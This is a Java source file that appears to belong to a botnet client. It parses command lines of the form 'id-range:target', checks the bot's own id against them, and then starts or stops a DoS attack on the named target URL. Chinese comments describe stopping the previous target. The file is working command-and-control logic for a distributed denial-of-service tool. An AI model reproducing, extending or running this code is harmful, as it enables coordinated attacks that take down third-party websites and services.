package deal;

import run.Run;

public class DealText {
	
	private String text;
	private String line[];
	private int id;
	
	private String num1 = "";  // num1-299
	private String num2 = "";  // 100-num2
	private String target = "";  // http://www.baidu.com
	
	private String num[][];
	/*
	 *     0    1    2 
	 * 0 num1 num2 target
	 * 1 num1 num2 target
	 * 2
	 * ...
	 */
	
	public DealText()
	{
		
	}
	
	public DealText(String text)
	{
		this.text = text;
		line = text.split(";\n");
		num = new String[line.length][3];
		this.id = Run.id;
	}
	
	public void run()
	{
		saveNum1Num2Target();
		dealNum1Num2Target();
	}
	
	private void saveNum1Num2Target()
	{
		for(String x:line)
		{
			System.out.println(x);
		}
		for(int i=0;i<line.length;i++)
		{
			char temp_char[] = line[i].toCharArray();
			J:
			for(int j=0;j<temp_char.length;j++)
			{
				if(temp_char[j]==':')
				{
					for(int k=j+1;k<temp_char.length;k++)
					{
						target = target + temp_char[k];
					}
				
					num[i][0] =  num1;
					num[i][1] =  num2;
					num[i][2] =  target;
					
					System.out.println(num1);
					System.out.println(num2);
					System.out.println(target);
					System.out.println("---");
					num1 = "";
					num2 = "";
					target = "";
					break J;
				}
				if(temp_char[j]=='-')
				{
					for(int k=j+1;k<temp_char.length;k++)
					{
						if(temp_char[k]==':')
						{
							j=k-1;
							continue J;
						}
						num2 = num2 + temp_char[k];
					}
				}
				if((temp_char[j]!='-')||(temp_char[j]!=':'))
				{
					for(int k=j;k<temp_char.length;k++)
					{
						if(temp_char[k]=='-'||temp_char[k]==':')
						{
							j=k-1;
							continue J;
						}
						num1 = num1 + temp_char[k];
					}
				}
			}
		}
	}
	
	private void dealNum1Num2Target()
	{
		I:
		for(int i=0;i<num.length;i++)
		{
			if(i==num.length-1)  //default匹配
			{
				//匹配到
				System.out.println(num[i][2]);
				try
				{
					if(DoS.address.equals(num[i][2]))  //匹配到与原来相同的
					{
						break I;
					}
				}
				catch(Exception ex)
				{
					ex.printStackTrace();
				}
				if(num[i][2].equals("stop"))  //匹配到stop,停止原先的命令
				{
					try
					{
						DoS.dos.stop();  //对上次的目标停止
					}
					catch(Exception ex)
					{
						ex.printStackTrace();
					}
				}
				else
				{
					sendTarget(num[i][2]);
				}
				break I;
			}
			else if(num[i][1].equals(""))
			{
				if(id==Integer.valueOf(num[i][0]))  //id==num1匹配
				{
					//匹配到
					System.out.println(num[i][2]);
					if(!DoS.address.equals(num[i][2]))
					{
						sendTarget(num[i][2]);
					}
					break I;
				}
				continue I;
			}
			else
			{
				if((id>=Integer.valueOf(num[i][0]))&&(id<=Integer.valueOf(num[i][1])))  //  num1<=id<=num2匹配
				{
					//匹配到
					System.out.println(num[i][2]);
					if(!DoS.address.equals(num[i][2]))
					{
						sendTarget(num[i][2]);
					}
					break I;
				}
			}
		}
		
	}
	
	private void sendTarget(String target)
	{
		try
		{
			DoS.dos.stop();  //对上次的目标停止
		}
		catch(Exception ex)
		{
			ex.printStackTrace();
		}
		finally
		{
			DoS dos = new DoS(target);
			dos.run();
		}
	}
	

}
